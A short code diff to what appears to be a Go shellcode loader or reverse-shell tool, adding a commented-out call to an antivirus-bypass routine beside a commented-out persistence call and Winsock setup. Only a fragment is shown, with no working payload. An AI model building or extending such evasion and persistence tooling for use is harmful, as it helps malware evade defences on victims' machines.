@@ -25,6 +25,7 @@ func Allocate(Shellcode uintptr) (uintptr) {
 }
 
 func main() {
+	//RSE.BypassAV(3)
 	//RSE.Persistence()
 	var WSA_Data syscall.WSAData
 	syscall.WSAStartup(uint32(0x202), &WSA_Data)
